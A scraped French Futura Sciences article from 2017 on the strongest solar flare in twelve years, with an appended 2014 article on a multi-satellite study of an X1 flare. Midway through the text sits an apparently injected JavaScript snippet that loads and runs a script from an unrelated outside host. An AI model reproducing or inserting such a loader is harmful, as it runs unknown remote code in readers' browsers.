{"title": "L'eruption solaire la plus puissante depuis 12 ans !", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-09-08", "content": "Ce 6 septembre, il se produisit sur le Soleil l'eruption de la decennie ! De classe X9.3, elle a ete la puissante depuis 2005. Un autre evenement de classe X (X2.2) l'a precedee trois heures plus tot. Ces derniers temps, l'activite de notre Soleil etait minimale. Cela faisait longtemps que ce n'etait pas arrive ! Le  Soleil , plutot d'humeur tranquille ces derniers temps a l'approche du minimum d'activite de son cycle de 11 ans (en moyenne), vient de produire deux enormes eruptions, dont une est la plus puissante de la decennie. Voir aussi : Le Soleil pourrait produire des eruptions mille fois plus puissantes Le matin du 6 septembre, deux jours apres un soubresaut de classe M (plutot modere), la region active 2673 (AR 2673) a ete le theatre de  deux evenements majeurs de classe X . Le premier, survenu a 9 h 10 TU, a ete classe X2.2. Et le second, a 12 h 02 TU, qui est de classe X9.3, s'est propulse directement a la 8 e  place du  Top 50 des eruptions depuis 1996  et a la 14 e  place depuis 1976 (voir le classement  ici ). Elle a ete la plus puissante  eruption solaire  depuis 2005 (X17 il y a 12 ans et 1 jour). Le 7 septembre, a 14 h 41 TU, une nouvelle eruption majeure a ete observee. Elle etait de classe X1.3. Sur cette animation, on peut voir les deux eruptions solaires survenues le 6 septembre. (c) Nasa, GSFC, SDO                               Quelle a ete la plus puissante eruption solaire ? Le phenomene a pris naissance au sein de la plus petite des deux taches sombres -- sa taille est approximativement de 9 fois la Terre -- qui compose la region active situee pres du limbe. Bien que celle-ci ne faisait pas directement face a notre planete, la tempete de particules solaires pourrait provoquer des aurores polaires au cours des prochains jours. La  NOAA  a indique que les rayonnements X et ultraviolets ont cause un puissant  black-out  dans les hautes frequences (de classe R3) et degrade les signaux dans les basses frequences, en particulier sur l'Afrique, l'Europe et l'ocean Atlantique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Tempetes solaires : l'evenement de 2012 servira-t-il de lecon ? L' eruption solaire  la plus puissante enregistree depuis 40 ans a ete celle dite d'Halloween, de classe X28, elle etait survenue le 4 novembre 2003. Fort heureusement, ce jour-la, la bourrasque de vent solaire ne s'est pas dirigee vers notre planete, epargnant aux Terriens, devenus tres dependants de l'electricite, une tempete geomagnetique catastrophique. Pour en savoir plus Une puissante eruption solaire observee comme jamais Article de Xavier Demeersman publie le 27 mai 2014 Le 29 mars 2014, la region active 2017 fut le theatre d'une puissante eruption solaire de classe X1. L'ensemble des satellites dedies a l'observation du Soleil se sont empresses de la scruter dans les moindres details livrant ainsi une vision inedite et tridimensionnelle de l'evenement. Les images viennent d'etre publiees. A la faveur du pic d'activite du  cycle solaire  24 que nous en sommes en train de vivre -- plus de mille jours consecutifs se sont ecoules, en effet, sans qu'au minimum un groupe de  taches sombres  ne soit observe a la surface de notre  etoile  --, des chercheurs ont coordonne plusieurs satellites et  telescopes  sur l'une des regions les plus actives afin de l'etudier avec un maximum de details. Disposant d'une flottille d'instruments spatiaux et terrestres dedies a l'observation du Soleil dans differentes  longueurs d'onde , l'equipe de physiciens solaires a ainsi concentre toute sa puissance de  feu , le 29 mars dernier, sur la region active 2017. Ce magnifique  archipel  de taches sombres distinctes dans le rayonnement visible -- la  photosphere  -- presentait alors les signes particuliers d'une intensification de son  champ magnetique ,  symptome  tangible d'une possible et imminente eruption importante. La cible choisie par l'equipe du telescope solaire Dunn (Observatoire Solaire National) au Nouveau-Mexique s'est averee prometteuse car, en effet, quelques heures apres le debut des operations, la region fut le theatre d'une violente  eruption de niveau X1  (la classe X est plus elevee ; la classe M concerne des eruptions plus moderees et frequentes). Les donnees collectees par toute la flotte de satellites dedies a l'observation du Soleil dans differentes longueurs d'onde -- auxquels s'est associe le telescope Dunn -- offrent aux physiciens solaires une merveilleuse occasion de reconstituer avec une precision inegalee l'evenement (eruption de classe X1) qui a secoue la surface de notre etoile, le 29 mars 2014 vers 17 h 46 TU. (c) Nasa, ONS, GSFC Toute la flotte de satellites d'observation solaire mobilisee Tres soucieux de comprendre l' emergence  de ces phenomenes, les scientifiques sont ravis de leur moisson.  << C'est l'ensemble de donnees le plus complet jamais recueillies par les observatoires d'heliophysique de la Nasa >>  commente Jonathan Cirtain, membre de l'equipe de  Hinode , satellite developpe par les agences spatiales americaine (Nasa) et japonaise (Jaxa) et sollicite pour cette etude. Ce dernier offrit un point de vue inedit sur les caracteristiques du  champ magnetique  avant et pendant la puissante eruption du 29 mars a 17 h 48 TU. Au moyen de son  spectrometre  EUV, les scientifiques ont pu suivre l'evolution a travers 4.800 kilometres dans les couches externes de l'etoile. Bien sur, la mission  SDO  ( Solar Dynamics Observatory ) fut mise a contribution pour determiner avec precision la position de la region la plus active. Lancee en juin 2013, la mission  Iris  ( Interface Region Imaging Spectrograph ) fut egalement mobilisee pour observer en tres haute resolution -- et differentes longueurs d'onde -- les transferts d' energie , temperatures et  vitesses  des couches inferieures de la region active. Parallelement, le  spectroscope   Rhessi  ( Reuven Ramaty High Energy Solar Spectroscopic Imager ) delivra des details sur les hautes energies (jusqu'a 25 millions de degres  Celsius ) deployees dans la  couronne solaire  et l'acceleration des particules dans la  chromosphere . Enfin, ajoutons qu'au meme moment les  coronographes  du venerable  Soho  enregistraient l' ejection de masse coronale  qui suivit l'eruption de classe X. Dans la banlieue terrestre, le  satellite geostationnaire   Goes  (de la  NOAA ,  National Oceanic and Atmospheric Administration ) enregistrait, quant a lui, le pic de rayonnement X produit par notre etoile. Fort de cette  masse  de donnees inedites, les helio-physiciens ont d'ores et deja commence a les traiter, a dessein de mieux apprehender ces phenomenes qui, lorsqu'ils sont diriges vers notre planete, peuvent un avoir un  impact non negligeable  sur nos societes ultra-connectees. ", "theme": "sciences"}